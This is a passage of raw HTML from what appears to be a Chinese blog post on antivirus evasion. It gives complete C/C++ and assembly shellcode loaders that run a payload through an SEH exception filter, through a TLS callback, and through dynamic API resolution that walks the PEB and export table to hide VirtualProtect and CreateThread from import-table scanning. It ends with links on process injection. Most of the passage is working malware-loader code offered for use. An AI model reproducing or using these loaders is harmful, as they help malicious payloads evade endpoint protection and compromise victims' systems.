&#x2F;&#x2F; shellcode执行完毕后，删除纤程对象</span><br><span class=\"line\">    DeleteFiber(shellcodeFiber);</span><br><span class=\"line\"></span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"基于SEH异常处理\"><a href=\"#基于SEH异常处理\" class=\"headerlink\" title=\"基于SEH异常处理\"></a>基于SEH异常处理</h2><p>SEH（Structured Exception Handling，结构化异常处理）是 Windows 平台提供的一种异常处理机制，它允许程序员编写结构化的代码来处理异常情况。SEH 提供了一种在程序中捕获、处理和传播异常的方法，可以有效地处理诸如访问违例、除以零、内存访问错误等异常情况。</p>\n<p>SEH 提供了以下关键元素来实现异常处理：</p>\n<ol>\n<li>__try 块：用于包裹可能会引发异常的代码块。</li>\n<li>__except 块：用于捕获和处理异常的代码块。</li>\n<li>__finally 块（可选）：用于执行清理操作的代码块，在异常处理完毕后无论是否发生异常都会执行。</li>\n<li>__leave 语句（可选）：用于退出包裹在 __try 块中的代码。</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;Windows.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">#pragma comment(linker, &quot;&#x2F;section:.data,RWE&quot;)</span><br><span class=\"line\">&#x2F;&#x2F;#pragma comment(linker,&quot;&#x2F;subsystem:\\&quot;Windows\\&quot; &#x2F;entry:\\&quot;mainCRTStartup\\&quot;&quot;)   &#x2F;&#x2F;不显示窗口 </span><br><span class=\"line\"></span><br><span class=\"line\">unsigned char buf[] &#x3D; &quot;shellcode is here&quot;;</span><br><span class=\"line\">int a &#x3D; 1;</span><br><span class=\"line\">int b &#x3D; 0;</span><br><span class=\"line\"></span><br><span class=\"line\">int exceptFilter()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tb &#x3D; 1; &#x2F;&#x2F; 修改b的值为1，以防止无限循环的异常处理</span><br><span class=\"line\">\t((void(*)(void)) &amp; buf)();</span><br><span class=\"line\">\treturn EXCEPTION_EXECUTE_HANDLER;</span><br><span class=\"line\">\t&#x2F;*</span><br><span class=\"line\">        异常处理函数的返回值除了有EXCEPTION_CONTINUE_EXECUTION,还有以下两个值:</span><br><span class=\"line\">        EXCEPTION_EXECUTE_HANDLER:常处理器已处理异常，程序应在_except块内继续执行</span><br><span class=\"line\">        EXCEPTION_CONTINUE_SEARCH:常处理器未处理异常，程序应继续搜索其他异常处理器</span><br><span class=\"line\">\t*&#x2F;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t__try &#123;</span><br><span class=\"line\">\t\tint c &#x3D; a &#x2F; b;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t__except (exceptFilter()) &#123;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"TLS机制\"><a href=\"#TLS机制\" class=\"headerlink\" title=\"TLS机制\"></a>TLS机制</h2><p><a href=\"https://xz.aliyun.com/t/12057?time__1311=mqmhBKD50I=h7DlxGo/tNbMCFD8tYzeD&alichlgref=https://cn.bing.com/\">TLS回调函数的学习</a>、<a href=\"https://idiotc4t.com/code-and-dll-process-injection/tls-code-execute\">TLS Code Execute</a></p>\n<p>线程局部存储（TLS），是一种变量的存储方法，这个变量在它所在的线程内是全局可访问的，但是不能被其他线程访问到，这样就保持了数据的线程独立性。在启用了TLS功能的PE文件中，会设置有关于TLS的TLS Table（TLS表），这个表的位置信息可以在IMAGE_DATA_DIRECTORY DataDirectory[9]中找到。</p>\n<p> TLS的数据结构体如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">32位</span><br><span class=\"line\">typedef struct _IMAGE_TLS_DIRECTORY32 &#123;</span><br><span class=\"line\">    DWORD   StartAddressOfRawData;</span><br><span class=\"line\">    DWORD   EndAddressOfRawData;</span><br><span class=\"line\">    DWORD   AddressOfIndex;             &#x2F;&#x2F; PDWORD</span><br><span class=\"line\">    DWORD   AddressOfCallBacks;         &#x2F;&#x2F; PIMAGE_TLS_CALLBACK *</span><br><span class=\"line\">    DWORD   SizeOfZeroFill;</span><br><span class=\"line\">    union &#123;</span><br><span class=\"line\">        DWORD Characteristics;</span><br><span class=\"line\">        struct &#123;</span><br><span class=\"line\">            DWORD Reserved0 : 20;</span><br><span class=\"line\">            DWORD Alignment : 4;</span><br><span class=\"line\">            DWORD Reserved1 : 8;</span><br><span class=\"line\">        &#125; DUMMYSTRUCTNAME;</span><br><span class=\"line\">    &#125; DUMMYUNIONNAME;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; IMAGE_TLS_DIRECTORY32;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">64位</span><br><span class=\"line\">typedef struct _IMAGE_TLS_DIRECTORY64 &#123;</span><br><span class=\"line\">    ULONGLONG StartAddressOfRawData;</span><br><span class=\"line\">    ULONGLONG EndAddressOfRawData;</span><br><span class=\"line\">    ULONGLONG AddressOfIndex;         &#x2F;&#x2F; PDWORD</span><br><span class=\"line\">    ULONGLONG AddressOfCallBacks;     &#x2F;&#x2F; PIMAGE_TLS_CALLBACK *;</span><br><span class=\"line\">    DWORD SizeOfZeroFill;</span><br><span class=\"line\">    union &#123;</span><br><span class=\"line\">        DWORD Characteristics;</span><br><span class=\"line\">        struct &#123;</span><br><span class=\"line\">            DWORD Reserved0 : 20;</span><br><span class=\"line\">            DWORD Alignment : 4;</span><br><span class=\"line\">            DWORD Reserved1 : 8;</span><br><span class=\"line\">        &#125; DUMMYSTRUCTNAME;</span><br><span class=\"line\">    &#125; DUMMYUNIONNAME;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; IMAGE_TLS_DIRECTORY64;</span><br></pre></td></tr></table></figure>\n\n<p>其中 <strong>AddressOfCallBacks</strong> 这个成员是一个指向函数地址数组的指针，这里的函数的地址就是 <strong>TLS回调函数</strong> 的实际地址</p>\n<p>TLS回调函数：</p>\n<p>每当创建/终止线程时会自动调用执行的函数（<strong>创建进程的主线程时也会自动调用回调函数，且回调函数的执行顺序是 先于EP代码 的执行，即先于main函数，所以TLS回调函数的这个特性通常被用于反调试技术</strong>）由于是创建和终止线程时都会调用，所以在程序从打开到结束这个TLS回调函数会被执行两次。</p>\n<p>TLS函数模板如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">typedef VOID (NTAPI *PIMAGE_TLS_CALLBACK)</span><br><span class=\"line\">(</span><br><span class=\"line\">    PVOID DllHandle,</span><br><span class=\"line\">    DWORD Reason,</span><br><span class=\"line\">    PVOID Reserved</span><br><span class=\"line\">);</span><br></pre></td></tr></table></figure>\n\n<p>32位与64位声明不同</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;Windows.h&gt;</span><br><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">unsigned char buf[] &#x3D;&quot;shellcode is here&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F;TLS回调函数</span><br><span class=\"line\">VOID NTAPI TlsCallBack(PVOID DllHandle, DWORD dwReason, PVOID Reserved)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tif (dwReason &#x3D;&#x3D; DLL_PROCESS_ATTACH)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tvoid* shellcode &#x3D; VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">\t\tRtlMoveMemory(shellcode, buf, sizeof(buf));</span><br><span class=\"line\">\t\t((void(*)()) shellcode)();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F;使用TLS需要在程序中新建一个.tls段专门存放TLS数据，申明使用</span><br><span class=\"line\">#ifdef _WIN64       &#x2F;&#x2F;64位</span><br><span class=\"line\">#pragma comment (linker, &quot;&#x2F;INCLUDE:_tls_used&quot;)  </span><br><span class=\"line\">#pragma comment (linker, &quot;&#x2F;INCLUDE:tls_callback_func&quot;) </span><br><span class=\"line\">#else               &#x2F;&#x2F;32位</span><br><span class=\"line\">#pragma comment (linker, &quot;&#x2F;INCLUDE:__tls_used&quot;) </span><br><span class=\"line\">#pragma comment (linker, &quot;&#x2F;INCLUDE:_tls_callback_func&quot;)</span><br><span class=\"line\">#endif</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F;注册TLS回调函数</span><br><span class=\"line\">#ifdef _WIN64</span><br><span class=\"line\">#pragma const_seg(&quot;.CRT$XLF&quot;) &#x2F;&#x2F;64位</span><br><span class=\"line\">EXTERN_C const</span><br><span class=\"line\">#else</span><br><span class=\"line\">#pragma data_seg(&quot;.CRT$XLF&quot;) &#x2F;&#x2F;32位</span><br><span class=\"line\">EXTERN_C</span><br><span class=\"line\">#endif</span><br><span class=\"line\"></span><br><span class=\"line\">PIMAGE_TLS_CALLBACK tls_callback_func[] &#x3D; &#123; TlsCallBack,0 &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">#ifdef _WIN64    </span><br><span class=\"line\">#pragma const_seg() &#x2F;&#x2F;64位</span><br><span class=\"line\">#else</span><br><span class=\"line\">#pragma data_seg() &#x2F;&#x2F;32位</span><br><span class=\"line\">#endif </span><br><span class=\"line\"></span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tprintf(&quot;After TLS&quot;);</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>tips：TLS的特性可以加入反调试：<a href=\"https://www.cnblogs.com/helloylh/p/17209669.html\">TLS及反调试机制</a></p>\n<h2 id=\"动态API加载\"><a href=\"#动态API加载\" class=\"headerlink\" title=\"动态API加载\"></a>动态API加载</h2><p>一些敏感API函数或敏感API函数组合会被监控，同时在PE导入表也会列出敏感函数，通过动态加载：<strong>调用函数在PE导入表中不可见</strong></p>\n<p>主要通过两个函数实现：<strong>GetProcAddress</strong> 和 <strong>LoadLibraryA</strong></p>\n<p><strong>一些前置：</strong></p>\n<p>在RING3下 <strong>FS寄存器</strong> 指向 <strong>TEB(线程结构体)</strong> ，在TEB+0x30处就是 <strong>PEB进程结构体</strong>，PEB+0xC的位置就是 <strong>_PEB_LDR_DATA结构体</strong>，里面包含了dll加载链，该结构体中的 <strong>InInitializationOrderModuleList</strong> 这个链表 <strong>第二个必定是kernel32.dll</strong></p>\n<p><strong>流程思路：</strong></p>\n<ul>\n<li>定位关键模块：首先找到包含核心API函数的关键模块（如kernel32.dll）。这通常可以通过解析PEB（Process Environment Block）中的模块列表来完成。</li>\n<li>获取GetProcAddress：定位到kernel32.dll后，需要解析导出表（Export Table）以获取GetProcAddress函数的地址。GetProcAddress是一个核心函数，用于在运行时动态解析其他API函数的地址。</li>\n<li>加载其他API：<strong>通过GetProcAddress函数</strong>，可以逐个获取其他需要的API函数的地址。例如，可以通过GetProcAddress获取VirtualProtect、CreateThread和WaitForSingleObject等函数的地址。</li>\n<li>准备Shellcode：将Shellcode存储在缓冲区中，使用VirtualProtect函数将缓冲区的内存页属性更改为可执行，以确保可以安全地执行Shellcode。</li>\n<li>创建线程并执行Shellcode：使用CreateThread函数创建一个新线程，并将Shellcode的地址作为线程的启动例程。线程创建后，使用WaitForSingleObject等待线程执行完成</li>\n</ul>\n<p><strong>编写：</strong></p>\n<p><strong>x86</strong>，直接利用汇编获取kernel32.dll地址</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">__asm &#123;</span><br><span class=\"line\">\t\tpush eax</span><br><span class=\"line\">\t\tmov eax, fs:[0x30]</span><br><span class=\"line\">\t\tmov eax, [eax + 0xc]</span><br><span class=\"line\">\t\tmov eax, [eax + 0x1c]</span><br><span class=\"line\">\t\tmov eax, [eax]</span><br><span class=\"line\">\t\tmov eax, [eax + 0x8]</span><br><span class=\"line\">\t\tmov kernel32Address,eax</span><br><span class=\"line\">\t\tpop eax</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;Windows.h&gt;</span><br><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">unsigned char buf[] &#x3D; &quot;shellcode is here&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">DWORD GetKernel32Address()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tDWORD kernel32Address &#x3D; 0;</span><br><span class=\"line\">\t__asm &#123;</span><br><span class=\"line\">\t\tpush eax</span><br><span class=\"line\">\t\tmov eax, fs:[0x30]</span><br><span class=\"line\">\t\tmov eax, [eax + 0xc]</span><br><span class=\"line\">\t\tmov eax, [eax + 0x1c]</span><br><span class=\"line\">\t\tmov eax, [eax]</span><br><span class=\"line\">\t\tmov eax, [eax + 0x8]</span><br><span class=\"line\">\t\tmov kernel32Address,eax</span><br><span class=\"line\">\t\tpop eax</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tprintf(&quot;[+]kernel32 base: 0x%p\\n&quot;, kernel32Address);</span><br><span class=\"line\">\treturn kernel32Address;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">DWORD RGetProcAddress(DWORD kernelbase)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t&#x2F;&#x2F; 获取Dos头即起始地址</span><br><span class=\"line\">\tPIMAGE_DOS_HEADER pDos &#x3D; (PIMAGE_DOS_HEADER)kernelbase;</span><br><span class=\"line\">\t&#x2F;&#x2F; 获取NT头</span><br><span class=\"line\">\tPIMAGE_NT_HEADERS pNt &#x3D; (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + kernelbase);</span><br><span class=\"line\">\t&#x2F;&#x2F; 数据目录</span><br><span class=\"line\">\tPIMAGE_DATA_DIRECTORY pDataDir &#x3D; pNt-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_EXPORT;</span><br><span class=\"line\">\t&#x2F;&#x2F; 导出表地址</span><br><span class=\"line\">\tPIMAGE_EXPORT_DIRECTORY pExport &#x3D; (PIMAGE_EXPORT_DIRECTORY)(pDataDir-&gt;VirtualAddress + kernelbase);</span><br><span class=\"line\">\tprintf(&quot;[+]Export Addr: 0x%p\\n&quot;, pExport);</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F;函数总数</span><br><span class=\"line\">\tDWORD dwFunCount &#x3D; pExport-&gt;NumberOfFunctions;</span><br><span class=\"line\">\t&#x2F;&#x2F;函数名称数量</span><br><span class=\"line\">\tDWORD dwFunNameCount &#x3D; pExport-&gt;NumberOfNames;</span><br><span class=\"line\">\t&#x2F;&#x2F;函数地址</span><br><span class=\"line\">\tPDWORD pAddrOfFun &#x3D; (PDWORD)(pExport-&gt;AddressOfFunctions + kernelbase);</span><br><span class=\"line\">\t&#x2F;&#x2F;函数名称地址</span><br><span class=\"line\">\tPDWORD pAddrOfNames &#x3D; (PDWORD)(pExport-&gt;AddressOfNames + kernelbase);</span><br><span class=\"line\">\t&#x2F;&#x2F;序号表</span><br><span class=\"line\">\tPWORD pAddrOfOrdinals &#x3D; (PWORD)(pExport-&gt;AddressOfNameOrdinals + kernelbase);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tfor (size_t i &#x3D; 0; i &lt; dwFunCount; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t&#x2F;&#x2F;判断函数地址是否存在,为空</span><br><span class=\"line\">\t\tif (!pAddrOfFun[i])</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tcontinue;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t&#x2F;&#x2F;通过函数地址遍历函数名称地址，获取想要的函数</span><br><span class=\"line\">\t\tDWORD dwFunAddrOffset &#x3D; pAddrOfFun[i];</span><br><span class=\"line\">\t\tfor (size_t j &#x3D; 0; j &lt; dwFunNameCount; j++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tif (pAddrOfOrdinals[j] &#x3D;&#x3D; i)</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\tDWORD dwNameOffset &#x3D; pAddrOfNames[j];</span><br><span class=\"line\">\t\t\t\tchar* pFunName &#x3D; (char*)(kernelbase + dwNameOffset);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t\tif (strcmp(pFunName, &quot;GetProcAddress&quot;) &#x3D;&#x3D; 0)</span><br><span class=\"line\">\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\tprintf(&quot;[+]GetProcAddress Addr: 0x%p\\n&quot;, dwFunAddrOffset + kernelbase);</span><br><span class=\"line\">\t\t\t\t\treturn dwFunAddrOffset + kernelbase;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; 根据原函数结构,声明定义api函数</span><br><span class=\"line\">typedef FARPROC(WINAPI* pGetProcAddress)(_In_ HMODULE hModule, _In_ LPCSTR lpProcName);</span><br><span class=\"line\">typedef BOOL(WINAPI* pVirtualProtect)(LPVOID, DWORD, DWORD, PDWORD);</span><br><span class=\"line\">typedef HANDLE(WINAPI* pCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);</span><br><span class=\"line\">typedef DWORD(WINAPI* pWaitForSingleObject)(HANDLE, DWORD);</span><br><span class=\"line\"></span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t&#x2F;&#x2F; kernel32地址</span><br><span class=\"line\">\tHMODULE kernelbase &#x3D; (HMODULE)GetKernel32Address();</span><br><span class=\"line\">\t&#x2F;&#x2F; GetProcAddress函数地址</span><br><span class=\"line\">\tpGetProcAddress MyGetProcAddress &#x3D; (pGetProcAddress)RGetProcAddress(kernelbase);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t&#x2F;&#x2F;开始获取各种函数</span><br><span class=\"line\">\tpVirtualProtect MyVirtualProtect &#x3D; (pVirtualProtect)MyGetProcAddress(kernelbase, &quot;VirtualProtect&quot;);</span><br><span class=\"line\">\tpCreateThread MyCreateThread &#x3D; (pCreateThread)MyGetProcAddress(kernelbase, &quot;CreateThread&quot;);</span><br><span class=\"line\">\tpWaitForSingleObject MyWaitForSingleObject &#x3D; (pWaitForSingleObject)MyGetProcAddress(kernelbase, &quot;WaitForSingleObject&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; 组合加载shellcode</span><br><span class=\"line\">\tDWORD oldProtect;</span><br><span class=\"line\">\tMyVirtualProtect((LPVOID)buf, sizeof(buf), PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class=\"line\">\tHANDLE hThread &#x3D; MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)(LPVOID)buf, NULL, 0, NULL);</span><br><span class=\"line\">\tMyWaitForSingleObject(hThread, INFINITE);</span><br><span class=\"line\"></span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>x64</strong>，默认无法使用汇编</p>\n<p>在项目中右键新建项 <code>GetInitializationOrderModuleList.asm</code> ，用于获取 <code>InitializationOrderModuleList</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">.CODE</span><br><span class=\"line\">    GetInInitializationOrderModuleList PROC</span><br><span class=\"line\">    mov rax,gs:[60h]</span><br><span class=\"line\">    mov rax,[rax+18h]</span><br><span class=\"line\">    mov rax,[rax+30h]</span><br><span class=\"line\">    ret</span><br><span class=\"line\">    GetInInitializationOrderModuleList ENDP</span><br><span class=\"line\">END</span><br></pre></td></tr></table></figure>\n\n<p>右键单击新建的asm文件, 选择属性, 在常规选项处将 <code>从生成中排除</code> 设置为 <code>否</code>, 项类型设置为 <code>自定义生成工具</code></p>\n<p>在自定义生成工具选项处</p>\n<p>在命令行框输入 <code>ml64 /Fo $(IntDir)%(fileName).obj /c %(fileName).asm</code></p>\n<p>在输出框输入 <code>$(IntDir)%(FileName).obj</code></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240410162639824.png\"></p>\n<p>打开项目属性，勾选 <code>C/C++-&gt;代码生成-&gt;禁用安全检查</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;Windows.h&gt;</span><br><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">unsigned char buf[] &#x3D; &quot;shellcode is here&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; 声明获取 InInitializationOrderModuleList 链表的函数</span><br><span class=\"line\">extern &quot;C&quot; PVOID __stdcall GetInInitializationOrderModuleList();</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; UNICODE_STRING 结构体定义</span><br><span class=\"line\">typedef struct _UNICODE_STRING &#123;</span><br><span class=\"line\">    USHORT Length;  &#x2F;&#x2F;表示字符串中的字符数,由于它是unicode形式的字符,因此每个字符占两个字节</span><br><span class=\"line\">    USHORT MaximumLength;  &#x2F;&#x2F;分配的内存空间的大小，以字节为单位</span><br><span class=\"line\">    PWSTR Buffer;  &#x2F;&#x2F;表示指向存储Unicode字符串的字符数组的指针</span><br><span class=\"line\">&#125; UNICODE_STRING, * PUNICODE_STRING;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; 获取 Kernel32.dll 的基地址</span><br><span class=\"line\">HMODULE GetKernel32Address() &#123;</span><br><span class=\"line\">    &#x2F;&#x2F; 获取 InInitializationOrderModuleList 链表</span><br><span class=\"line\">    LIST_ENTRY* pNode &#x3D; (LIST_ENTRY*)GetInInitializationOrderModuleList();</span><br><span class=\"line\">    while (1) &#123;</span><br><span class=\"line\">        &#x2F;&#x2F; 获取 FullDllName 成员</span><br><span class=\"line\">        UNICODE_STRING* FullDllName &#x3D; (UNICODE_STRING*)((BYTE*)pNode + 0x38);</span><br><span class=\"line\">        &#x2F;&#x2F; 如果 Buffer 中的第 13 个字符为空字符，则已找到 Kernel32.dll</span><br><span class=\"line\">        if (*(FullDllName-&gt;Buffer + 12) &#x3D;&#x3D; &#39;\\0&#39;) &#123;</span><br><span class=\"line\">            &#x2F;&#x2F; 返回模块的基地址</span><br><span class=\"line\">            return (HMODULE)(*((ULONG64*)((BYTE*)pNode + 0x10)));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        pNode &#x3D; pNode-&gt;Flink;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; 获取 GetProcAddress 函数的地址</span><br><span class=\"line\">DWORD64 RGetProcAddress(HMODULE hKernal32) &#123;</span><br><span class=\"line\">    &#x2F;&#x2F; 获取 DOS 头</span><br><span class=\"line\">    PIMAGE_DOS_HEADER baseAddr &#x3D; (PIMAGE_DOS_HEADER)hKernal32;</span><br><span class=\"line\">    &#x2F;&#x2F; 获取 NT 头</span><br><span class=\"line\">    PIMAGE_NT_HEADERS pImageNt &#x3D; (PIMAGE_NT_HEADERS)((LONG64)baseAddr + baseAddr-&gt;e_lfanew);</span><br><span class=\"line\">    &#x2F;&#x2F; 获取导出表</span><br><span class=\"line\">    PIMAGE_EXPORT_DIRECTORY exportDir &#x3D; (PIMAGE_EXPORT_DIRECTORY)((LONG64)baseAddr + pImageNt-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);</span><br><span class=\"line\">    &#x2F;&#x2F; 获取导出函数地址数组、导出函数名数组和导出函数序号数组</span><br><span class=\"line\">    PULONG RVAFunctions &#x3D; (PULONG)((LONG64)baseAddr + exportDir-&gt;AddressOfFunctions);</span><br><span class=\"line\">    PULONG RVANames &#x3D; (PULONG)((LONG64)baseAddr + exportDir-&gt;AddressOfNames);</span><br><span class=\"line\">    PUSHORT AddressOfNameOrdinals &#x3D; (PUSHORT)((LONG64)baseAddr + exportDir-&gt;AddressOfNameOrdinals);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x2F;&#x2F; 遍历导出函数</span><br><span class=\"line\">    for (size_t i &#x3D; 0; i &lt; exportDir-&gt;NumberOfNames; i++) &#123;</span><br><span class=\"line\">        &#x2F;&#x2F; 获取当前函数地址</span><br><span class=\"line\">        LONG64 F_va_Tmp &#x3D; (ULONG64)((LONG64)baseAddr + RVAFunctions[(USHORT)AddressOfNameOrdinals[i]]);</span><br><span class=\"line\">        &#x2F;&#x2F; 获取当前函数名地址</span><br><span class=\"line\">        PUCHAR FunctionName &#x3D; (PUCHAR)((LONG64)baseAddr + RVANames[i]);</span><br><span class=\"line\">        &#x2F;&#x2F; 如果当前函数名是 &quot;GetProcAddress&quot;，返回其地址</span><br><span class=\"line\">        if (!strcmp((const char*)FunctionName, &quot;GetProcAddress&quot;)) &#123;</span><br><span class=\"line\">            return F_va_Tmp;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; 定义函数指针类型</span><br><span class=\"line\">typedef FARPROC(WINAPI* pGetProcAddress)(HMODULE, LPCSTR);</span><br><span class=\"line\">typedef BOOL(WINAPI* pVirtualProtect)(LPVOID, DWORD, DWORD, PDWORD);</span><br><span class=\"line\">typedef HANDLE(WINAPI* pCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);</span><br><span class=\"line\">typedef DWORD(WINAPI* pWaitForSingleObject)(HANDLE, DWORD);</span><br><span class=\"line\"></span><br><span class=\"line\">int main() &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x2F;&#x2F; 获取 Kernel32.dll 的基地址和GetProcAddress函数地址</span><br><span class=\"line\">    HMODULE hKernal32 &#x3D; GetKernel32Address();</span><br><span class=\"line\">    pGetProcAddress MyGetProcAddress &#x3D; (pGetProcAddress)RGetProcAddress(hKernal32);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x2F;&#x2F;开始获取各种函数</span><br><span class=\"line\">    pVirtualProtect MyVirtualProtect &#x3D; (pVirtualProtect)MyGetProcAddress(hKernal32, &quot;VirtualProtect&quot;);</span><br><span class=\"line\">    pCreateThread MyCreateThread &#x3D; (pCreateThread)MyGetProcAddress(hKernal32, &quot;CreateThread&quot;);</span><br><span class=\"line\">    pWaitForSingleObject MyWaitForSingleObject &#x3D; (pWaitForSingleObject)MyGetProcAddress(hKernal32, &quot;WaitForSingleObject&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x2F;&#x2F; 组合加载shellcode</span><br><span class=\"line\">    DWORD oldProtect;</span><br><span class=\"line\">    MyVirtualProtect((LPVOID)buf, sizeof(buf), PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class=\"line\">    HANDLE hThread &#x3D; MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)(LPVOID)buf, NULL, 0, NULL);</span><br><span class=\"line\">    MyWaitForSingleObject(hThread, INFINITE);</span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>参考：</p>\n<p><a href=\"http://www.pentester.top/index.php/archives/65/\">免杀技巧之API动态加载技术</a></p>\n<p><a href=\"https://idiotc4t.com/defense-evasion/overwrite-winapi-bypassav\">通过重写ring3 API函数实现免杀</a></p>\n<p><a href=\"https://cloud.tencent.com/developer/video/34367\">动态调用系统API避免导入表检测</a></p>\n<p><a href=\"https://xz.aliyun.com/t/12035?time__1311=mqmhBKD50KGK4WqGNDQbiQvdS4NwPGOb8eD&alichlgref=https://cn.bing.com/\">通过隐藏导入表的方式规避杀软</a></p>\n<p>工具：</p>\n<p><a href=\"https://github.com/JustasMasiulis/lazy_importer\">lazy_importer: library for importing functions from dlls in a hidden, reverse engineer unfriendly way</a></p>\n<h2 id=\"进程注入-x\"><a href=\"#进程注入-x\" class=\"headerlink\" title=\"进程注入(x)\"></a>进程注入(x)</h2><p>大块内容，暂时挖坑</p>\n<p><a href=\"https://bbs.kanxue.com/thread-271554.htm\">高级进程注入总结</a></p>\n<p><a href=\"https://www.cnblogs.com/bonelee/p/15957493.html\">进程注入、代码注入、傀儡注入检测</a></p>\n<p><a href=\"https://www.cnblogs.com/LittleHann/p/6336950.html\">Windows Process Injection(Windows进程注入)</a></p>\n<p><a href=\"https://www.elastic.co/cn/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\">Ten process injection techniques: A technical survey of common and trending process injection techniques | Elastic Blog</a></p>\n<p><a href=\"https://www.secforce.com/blog/dll-hollowing-a-deep-dive-into-a-stealthier-memory-allocation-variant/\">SECFORCE - Security without compromise</a></p>\n<p><a href=\"https://trustedsec.com/blog/burrowing-a-hollow-in-a-dll-to-hide\">TrustedSec | Burrowing a Hollow in a DLL to Hide</a></p>\n<p><a 